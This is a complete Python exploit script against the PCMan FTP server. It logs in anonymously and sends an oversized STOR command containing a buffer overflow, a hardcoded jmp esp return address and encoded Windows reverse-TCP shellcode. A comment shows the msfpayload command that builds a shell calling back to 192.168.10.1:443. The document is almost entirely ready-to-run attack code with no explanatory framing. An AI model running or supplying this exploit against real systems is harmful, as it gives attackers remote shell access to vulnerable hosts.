#!/usr/bin/python
#-------------------------------------------------------------------#
#			Name : Rio Atmadja			    #
#		       Script: ftp_pcman		   	    #
#-------------------------------------------------------------------#
import socket, sys, os, time

if len(sys.argv) != 2:
        print "[*] Usage: %s <Ip address> \n" % sys.argv[0]
        sys.exit(0)
target = sys.argv[1]

# msfpayload windows/shell_reverse_tcp LHOST=192.168.10.1 LPORT=443 R | msfencode -a x86 -b '\x00\xff\x0a\x0d\x20\x40' -t c
shellcode = ("\xdb\xc9\xba\x9c\xfc\x7c\xee\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x4f\x31\x55\x19\x03\x55\x19\x83\xed\xfc\x7e\x09\x80\x06\xf7"
"\xf2\x79\xd7\x67\x7a\x9c\xe6\xb5\x18\xd4\x5b\x09\x6a\xb8\x57"
"\xe2\x3e\x29\xe3\x86\x96\x5e\x44\x2c\xc1\x51\x55\x81\xcd\x3e"
"\x95\x80\xb1\x3c\xca\x62\x8b\x8e\x1f\x63\xcc\xf3\xd0\x31\x85"
"\x78\x42\xa5\xa2\x3d\x5f\xc4\x64\x4a\xdf\xbe\x01\x8d\x94\x74"
"\x0b\xde\x05\x03\x43\xc6\x2e\x4b\x74\xf7\xe3\x88\x48\xbe\x88"
"\x7a\x3a\x41\x59\xb3\xc3\x73\xa5\x1f\xfa\xbb\x28\x5e\x3a\x7b"
"\xd3\x15\x30\x7f\x6e\x2d\x83\xfd\xb4\xb8\x16\xa5\x3f\x1a\xf3"
"\x57\x93\xfc\x70\x5b\x58\x8b\xdf\x78\x5f\x58\x54\x84\xd4\x5f"
"\xbb\x0c\xae\x7b\x1f\x54\x74\xe2\x06\x30\xdb\x1b\x58\x9c\x84"
"\xb9\x12\x0f\xd0\xbb\x78\x58\x15\xf1\x82\x98\x31\x82\xf1\xaa"
"\x9e\x38\x9e\x86\x57\xe6\x59\xe8\x4d\x5e\xf5\x17\x6e\x9e\xdf"
"\xd3\x3a\xce\x77\xf5\x42\x85\x87\xfa\x96\x09\xd8\x54\x49\xe9"
"\x88\x14\x39\x81\xc2\x9a\x66\xb1\xec\x70\x11\xf6\x7b\xbb\x8a"
"\xf2\x7a\x53\xc9\x02\x7c\x18\x44\xe4\x14\x4e\x01\xbf\x80\xf7"
"\x08\x4b\x30\xf7\x86\xdb\xd1\x6a\x4d\x1b\x9f\x96\xda\x4c\xc8"
"\x69\x13\x18\xe4\xd0\x8d\x3e\xf5\x85\xf6\xfa\x22\x76\xf8\x03"
"\xa6\xc2\xde\x13\x7e\xca\x5a\x47\x2e\x9d\x34\x31\x88\x77\xf7"
"\xeb\x42\x2b\x51\x7b\x12\x07\x62\xfd\x1b\x42\x14\xe1\xaa\x3b"
"\x61\x1e\x02\xac\x65\x67\x7e\x4c\x89\xb2\x3a\x7c\xc0\x9e\x6b"
"\x15\x8d\x4b\x2e\x78\x2e\xa6\x6d\x85\xad\x42\x0e\x72\xad\x27"
"\x0b\x3e\x69\xd4\x61\x2f\x1c\xda\xd6\x50\x35")

vulparameter= '/../'
jmp_esp = "\x53\x93\x42\x7e" #7E429353 ( user32.dll -> jmp esp )
payload = '\x41' * 2003 + jmp_esp + '\x90' * 16 + shellcode  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Connect to %s on port %d" % (target,21)
try:
	s.connect((target,21))
        s.recv(1024)
	s.send('USER anonymous\r\n') 
	s.recv(1024)
	s.send('PASS polunchis\r\n')
	s.recv(1024)
	s.send("STOR " + vulparameter + payload + "\r\n")
        print "[+] Sending payload of size " +  str(len(payload)) + " Bytes "
	s.close()
	print "[+] Exploit Sent Successfully"
except:
	print "[-] Could not connect to " + target + ":21\r"
        sys.exit(0) 
